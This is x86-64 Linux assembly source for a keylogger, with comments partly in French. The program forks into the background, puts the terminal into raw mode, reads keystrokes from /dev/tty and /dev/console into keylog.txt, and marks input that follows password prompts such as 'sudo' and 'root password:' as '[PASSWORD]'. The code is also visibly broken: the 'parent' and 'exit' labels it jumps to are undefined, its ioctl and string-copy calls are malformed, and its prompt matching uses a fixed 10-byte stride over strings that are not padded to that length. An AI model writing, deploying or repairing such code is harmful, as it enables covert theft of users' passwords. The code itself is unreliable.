section .data
    fname db "keylog.txt", 0
    tty_path db "/dev/tty", 0   
    console_path db "/dev/console", 0  
    ctrl_file db "k.ctrl", 0     
    fd dq 0                    
    tty_fd dq 0                
    console_fd dq 0            
    ctrl_fd dq 0               
    tbuf db 64 dup(0)          
    nl db 0xa                  
    s db " | ", 0              
    dpid dq 0                  
    detecting_password db 0    
    password_detected db "[PASSWORD]", 0  

    password_prompts db "password:", "Passwd:", "Enter PW:", "sudo", "root password:", "login:", "Authentication required", 0
    password_prompts_len equ 7

section .bss
    buf resb 1                 
    tspec resq 2               
    termios resb 60            
    last_chars resb 20        

section .text
global _start

_start:
    mov rax, 57            
    syscall
    
    cmp rax, 0
    je child              
    mov [dpid], rax      
    jmp parent           

child:
    mov rax, 2            
    mov rdi, fname
    mov rsi, 102o        
    mov rdx, 0644o       
    syscall
    mov [fd], rax

    mov rax, 2
    mov rdi, tty_path
    mov rsi, 2           
    mov rdx, 0
    syscall
    mov [tty_fd], rax

    mov rax, 2
    mov rdi, console_path
    mov rsi, 2           
    mov rdx, 0
    syscall
    mov [console_fd], rax

    mov rax, 16          
    mov rdi, [tty_fd]
    mov rsi, termios
    syscall

    mov byte [termios+3], 0   
    mov byte [termios+6], 1   
    mov byte [termios+7], 0   

    mov rax, 16          
    mov rdi, [tty_fd]
    mov rsi, 2           
    mov rdx, termios
    syscall

    mov rax, 2
    mov rdi, ctrl_file
    mov rsi, 102o
    mov rdx, 0644o
    syscall
    mov [ctrl_fd], rax

loop:
    mov rax, 0
    mov rdi, [ctrl_fd]
    mov rsi, buf
    mov rdx, 1
    syscall

    cmp rax, 1           
    je exit

    mov rax, 228         
    mov rdi, 0           
    mov rsi, tspec
    syscall

    mov byte [buf], 0

    ; Lire depuis /dev/tty
    mov rax, 0                
    mov rdi, [tty_fd]                
    mov rsi, buf
    mov rdx, 1                
    syscall

    cmp rax, 1
    jne check_console

    jmp process_key

check_console:
    ; Lire depuis /dev/console
    mov byte [buf], 0
    mov rax, 0
    mov rdi, [console_fd]
    mov rsi, buf
    mov rdx, 1
    syscall

    cmp rax, 1
    jne loop

process_key:
    mov rsi, last_chars       
    mov rcx, 19                
    rep movsb                 
    mov [last_chars+19], al    

    call check_password_prompt
    cmp byte [detecting_password], 1
    jne loop

    ; Ajouter un marqueur de mot de passe détecté
    mov rax, 1                
    mov rdi, [fd]
    mov rsi, password_detected
    mov rdx, 11              
    syscall

    mov rax, 1                
    mov rdi, [fd]
    mov rsi, tbuf
    mov rdx, 20              
    syscall

    mov rax, 1
    mov rdi, [fd]
    mov rsi, s
    mov rdx, 3
    syscall

    mov rax, 1                
    mov rdi, [fd]
    mov rsi, buf
    mov rdx, 1
    syscall

    mov rax, 1
    mov rdi, [fd]
    mov rsi, nl
    mov rdx, 1
    syscall

    jmp loop

check_password_prompt:
    mov rdi, last_chars
    mov rsi, password_prompts
    mov rcx, password_prompts_len

.password_check_loop:
    cmp rcx, 0
    je .no_password
    
    push rcx
    push rdi
    push rsi
    
    mov rcx, 10
    repe cmpsb
    je .found_password
    
    pop rsi
    pop rdi
    pop rcx
    add rsi, 10
    loop .password_check_loop

.no_password:
    mov byte [detecting_password], 0
    ret

.found_password:
    mov byte [detecting_password], 1
    ret
